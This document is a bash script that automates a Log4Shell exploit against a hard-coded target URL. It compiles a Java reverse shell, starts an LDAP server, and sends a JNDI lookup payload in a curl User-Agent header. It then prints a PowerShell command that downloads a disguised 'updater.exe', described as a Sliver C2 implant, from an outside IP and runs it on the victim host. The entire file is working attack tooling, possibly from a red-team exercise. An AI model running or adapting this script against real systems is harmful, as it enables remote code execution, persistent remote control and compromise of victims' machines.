#!/bin/bash

attacker_ip="<set IP>" # IP address of the host executing this script
vulnerable_url="http://208.11.20.100:8080/msn_apps/api/vulnerable/user" # Url vulnerable to Log4j
reverse_shell="./ReverseShell" # Do not include file extention, e.g. '/home/user/folder/ReverseShell'
c2_payload_url='http://94.249.192.1:8000/updater.exe' # Location of where the Sliver malware is hosted
log4rce="./log4rce.py" # Path to log4rce.py

echo 'Executing in 10 seconds'
echo 'Troubleshooting checklist:'
echo '[] Did you update IP/Port in ReverseShell.java?'
echo '[] Did you properly set all variables at the top of this script before execution?'
echo '[] Did you start you netcat listener? (Same IP/Port as in the ReverseShell.java)'
sleep 10

echo '   [+] Compiling reverse shell payload ...'
javac -source 1.7 -target 1.7 $reverse_shell.java -Xlint:-options

echo
echo '   [+] Reverse shell compiled ...'
sleep 1

echo
echo '   [+] Starting LDAP server listener ...'
python3 $log4rce --java_class $reverse_shell.class --ldap_rhost "$attacker_ip" --http_rhost "$attacker_ip" &
py_pid=$! # Saving PID to kill processes later
sleep 3

echo
echo '   [+] Triggering Log4j exploit ...'
curl -A "\${jndi:ldap://$attacker_ip:1387/ReverseShell}" $vulnerable_url &
curl_pid=$! # Saving PID to kill processes later
sleep 3

echo
echo
echo '   [+] Log4j exploit sent, check for reverse shell.'

echo '   [+] Attempting to kill associated scripts ...'
kill -9 $py_pid `expr $py_pid + 2` `expr $py_pid + 3`
sleep 1

echo
echo '   [+] Be sure to cleanup manually if there were any errors during the cleanup above'
sleel 1

echo
echo '   [+] Killing curl process ...'
kill -9 $curl_pid
sleep 1

echo
echo
echo '   [+] Now transfer and execute the C2 implant with the below command on the victim host:'
echo "powershell -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '$c2_payload_url' -OutFile '%appdata%\updater.exe'; %appdata%\updater.exe\""
echo